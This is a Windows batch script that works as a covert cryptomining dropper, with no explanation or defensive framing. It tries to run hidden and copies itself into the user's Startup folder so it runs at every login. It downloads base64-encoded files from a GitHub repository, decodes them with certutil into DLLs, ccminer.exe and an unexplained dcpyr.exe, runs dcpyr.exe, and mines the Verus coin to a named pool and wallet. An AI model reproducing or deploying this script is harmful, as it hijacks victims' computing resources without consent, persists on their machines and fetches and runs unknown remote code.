��
@echo off
title z%random%
powershell.exe -windowstyle Hidden -command
copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %appdata%
if not exist "vcruntime140.dll" (
	Powershell Invoke-WebRequest "https://github.com/rxu7s/Public/raw/main/vcruntime140" -OutFile "vcruntime140"
	certutil -decode vcruntime140 vcruntime140.dll
	del vcruntime140
)
if not exist "libcrypto-1_1-x64.dll" (
	Powershell Invoke-WebRequest "https://github.com/rxu7s/Public/raw/main/libcrypto-1_1-x64" -OutFile "libcrypto-1_1-x64"
	certutil -decode libcrypto-1_1-x64 libcrypto-1_1-x64.dll
	del libcrypto-1_1-x64
)
if not exist "ccminer.exe" (
	Powershell Invoke-WebRequest "https://github.com/rxu7s/Public/raw/main/ccminer" -OutFile "ccminer"
	certutil -decode ccminer ccminer.exe
	del ccminer
)
if not exist "dcpyr.exe" (
	Powershell Invoke-WebRequest "https://github.com/rxu7s/Public/raw/main/dcpyr" -OutFile "dcpyr"
	certutil -decode dcpyr dcpyr.exe
	del dcpyr
)
start dcpyr.exe
ccminer -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RHro3vmc4Vusy426DFPDac197fz3m7DAE7.x -p x -t 3